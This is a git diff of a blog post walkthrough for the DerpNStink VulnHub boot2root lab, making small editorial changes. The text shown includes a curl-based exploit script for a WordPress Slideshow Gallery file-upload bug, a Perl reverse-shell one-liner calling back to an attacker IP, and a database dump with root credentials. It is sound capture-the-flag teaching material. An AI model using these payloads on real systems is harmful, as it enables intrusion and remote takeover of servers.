@@ -5,9 +5,9 @@ category: Walkthrough
 tags: [VulnHub, "DerpNStink"]
 comments: true
 image:
-  feature: ouch.jpg
-  credit: stevepb / Pixabay
-  creditlink: https://pixabay.com/en/slip-up-danger-careless-slippery-709045/
+  feature: careless.jpg
+  credit: mohamed_hassan / Pixabay
+  creditlink: https://pixabay.com/en/life-suicide-leaving-reaching-3089646/
 ---
 
 This post documents the complete walkthrough of DerpNStink: 1, a boot2root [VM][1] created by [Bryan Smith][2] and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
@@ -212,7 +212,7 @@ There was also another hint from `/webnotes/info.txt` to do likewise.
 
 ### Slideshow Gallery < 1.4.7 Arbitrary File Upload
 
-Using `wpscan`, it was extremely simple to enumerate vulnerable WordPress plugins. As it turned out, this particular version 1.4.6 had an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).
+Using `wpscan`, it was extremely simple to enumerate vulnerable WordPress plugins. As it turned out, this particular version (1.4.6) had an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).
 
 I wrote `upload.sh`, a `bash` script that does just that.
 
@@ -226,12 +226,14 @@ PASS=$USER
 VULN="wp-admin/admin.php?page=slideshow-slides&method=save"
 FILE=$1
 
+# authenticate
 curl \
     -s \
     -c cookie \
     -d "log=$USER&pwd=$PASS&wp-submit=Log" \
     http://$HOST/$BLOG/wp-login.php
 
+# exploit
 curl \
     -s \
     -b cookie \
@@ -268,9 +270,7 @@ A simple PHP file that executes remote command was uploaded using the script.
 
 ### Low Privilege Shell
 
-Now that I've uploaded the file, the next step is to navigate to `http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php` to trigger a reverse shell.
-
-Whenever possible, I like to use Perl for my reverse shell.
+Now that I've uploaded the file, the next step is to trigger a reverse shell. Whenever possible, I like to use Perl for my reverse shell.
 
 ```perl
 perl -e 'use Socket;$i="192.168.10.129";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -316,7 +316,7 @@ Let's proceed to dump and view the database.
 $ mysqldump -uroot -pmysql wordpress > /tmp/dump.txt
 ```
 
-Two things stood out from the dump: **flag** and **password hashes**.
+Two things stood out from the dump: **flag** and **password hash**.
 
 ```
 'flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)','Flag.txt','','draft','open','open'
